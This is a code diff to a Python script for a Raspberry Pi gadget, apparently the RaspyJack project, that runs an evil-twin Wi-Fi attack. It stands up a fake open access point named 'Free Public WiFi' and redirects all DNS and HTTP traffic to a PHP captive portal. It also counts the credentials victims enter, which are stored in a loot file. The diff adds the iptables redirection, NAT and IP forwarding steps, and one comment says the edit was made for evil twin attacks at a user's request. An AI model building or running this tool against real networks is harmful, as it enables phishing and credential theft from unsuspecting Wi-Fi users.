@@ -36,11 +36,12 @@ import signal
 import subprocess
 import threading
 sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
+sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))) # Add parent directory for monitor_mode_helper (for consistency, though not used for AP mode)
 import RPi.GPIO as GPIO
 import LCD_1in44, LCD_Config
 from PIL import Image, ImageDraw, ImageFont
 
-WIFI_INTERFACE = "wlan1"
+WIFI_INTERFACE = "wlan1" # Hardcoded to wlan1 as per user request for evil twin attacks
 FAKE_AP_SSID = "Free Public WiFi"
 FAKE_AP_CHANNEL = "1"
 RASPYJACK_DIR = os.path.abspath(os.path.join(__file__, '..', '..'))
@@ -75,9 +76,14 @@ def cleanup(*_):
             try: os.killpg(os.getpgid(proc.pid), signal.SIGTERM) 
             except: pass
         attack_processes.clear()
+        # Restore network settings
         subprocess.run("iptables -F; iptables -t nat -F", shell=True)
         subprocess.run("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
-        subprocess.run(f"ifconfig {WIFI_INTERFACE} down; iwconfig {WIFI_INTERFACE} mode managed; ifconfig {WIFI_INTERFACE} up", shell=True)
+        subprocess.run(f"ifconfig {WIFI_INTERFACE} down", shell=True)
+        subprocess.run(f"iwconfig {WIFI_INTERFACE} mode managed", shell=True) # Restore to managed mode
+        subprocess.run(f"ifconfig {WIFI_INTERFACE} up", shell=True)
+        subprocess.run("systemctl start NetworkManager", shell=True) # Restart NetworkManager
+        subprocess.run("systemctl start wpa_supplicant", shell=True) # Restart wpa_supplicant
         if os.path.exists(TEMP_CONF_DIR): subprocess.run(f"rm -rf {TEMP_CONF_DIR}", shell=True)
 
 signal.signal(signal.SIGINT, cleanup)
@@ -193,18 +199,40 @@ def handle_file_selection_logic():
         time.sleep(0.1)
 
 def start_attack():
+    # Kill conflicting processes
     subprocess.run("pkill wpa_supplicant; pkill dnsmasq; pkill hostapd; pkill php", shell=True, capture_output=True)
+    
+    # Create temporary config directory
     os.makedirs(TEMP_CONF_DIR, exist_ok=True)
+    
+    # Configure hostapd
     hostapd_conf_path = os.path.join(TEMP_CONF_DIR, "hostapd.conf")
     with open(hostapd_conf_path, "w") as f: f.write(f"interface={WIFI_INTERFACE}\ndriver=nl80211\nssid={FAKE_AP_SSID}\nhw_mode=g\nchannel={FAKE_AP_CHANNEL}\n")
+    
+    # Configure dnsmasq
     dnsmasq_conf_path = os.path.join(TEMP_CONF_DIR, "dnsmasq.conf")
     with open(dnsmasq_conf_path, "w") as f: f.write(f"interface={WIFI_INTERFACE}\ndhcp-range=10.0.0.10,10.0.0.100,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\naddress=/#/10.0.0.1\n")
+    
+    # Clear old loot file if it exists
     if os.path.exists(LOOT_FILE): os.remove(LOOT_FILE)
     
+    # Bring interface down, set to master mode, and bring up with static IP
     subprocess.run(f"ifconfig {WIFI_INTERFACE} down", shell=True)
     subprocess.run(f"iwconfig {WIFI_INTERFACE} mode master", shell=True)
     subprocess.run(f"ifconfig {WIFI_INTERFACE} up 10.0.0.1 netmask 255.255.255.0", shell=True)
     
+    # Enable IP forwarding
+    subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
+    
+    # Setup iptables for NAT and DNS redirection
+    subprocess.run("iptables -F", shell=True)
+    subprocess.run("iptables -t nat -F", shell=True)
+    subprocess.run("iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-ports 53", shell=True)
+    subprocess.run("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 80", shell=True)
+    subprocess.run(f"iptables -A FORWARD -i {WIFI_INTERFACE} -o eth0 -j ACCEPT", shell=True) # Assuming eth0 is internet-facing
+    subprocess.run(f"iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE", shell=True) # Assuming eth0 is internet-facing
+
+    # Start hostapd
     attack_processes['hostapd'] = subprocess.Popen(f"hostapd {hostapd_conf_path}", shell=True, preexec_fn=os.setsid, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
     time.sleep(2)
     if attack_processes['hostapd'].poll() is not None:
@@ -212,6 +240,7 @@ def start_attack():
         print(f"ERROR: hostapd failed to start. Stderr: {error_msg}", file=sys.stderr)
         return False, f"hostapd failed: {error_msg[:50]}..."
 
+    # Start dnsmasq
     attack_processes['dnsmasq'] = subprocess.Popen(f"dnsmasq -C {dnsmasq_conf_path} -d", shell=True, preexec_fn=os.setsid, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
     time.sleep(2)
     if attack_processes['dnsmasq'].poll() is not None:
@@ -219,6 +248,7 @@ def start_attack():
         print(f"ERROR: dnsmasq failed to start. Stderr: {error_msg}", file=sys.stderr)
         return False, f"dnsmasq failed: {error_msg[:50]}..."
 
+    # Start PHP web server
     attack_processes['php'] = subprocess.Popen(f"php -S 10.0.0.1:80 -t {CAPTIVE_PORTAL_PATH}", shell=True, preexec_fn=os.setsid, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
     time.sleep(2)
     if attack_processes['php'].poll() is not None:
@@ -232,13 +262,17 @@ def monitor_status():
     while running:
         try:
             with open("/var/lib/misc/dnsmasq.leases", "r") as f: status_info["clients"] = len(f.readlines())
-        except: status_info["clients"] = 0
+        except:
+            status_info["clients"] = 0
         try:
             with open(LOOT_FILE, "r") as f: status_info["credentials"] = len(f.read().split("----\n")) -1
-        except: status_info["credentials"] = 0
+        except:
+            status_info["credentials"] = 0
         time.sleep(5)
 
 if __name__ == '__main__':
+    current_screen = "main"
+    is_attacking = False
     try:
         last_button_press_time = 0
         BUTTON_DEBOUNCE_TIME = 0.3 # seconds
@@ -262,7 +296,7 @@ if __name__ == '__main__':
                         threading.Thread(target=monitor_status, daemon=True).start()
                     else:
                         draw_ui("error", error_message)
-                        while GPIO.input(PINS["OK"]) != 0:
+                        while GPIO.input(PINS["OK"]) != 0: # Wait for user to acknowledge error
                             time.sleep(0.1)
                         current_screen = "main"
                     time.sleep(BUTTON_DEBOUNCE_TIME)
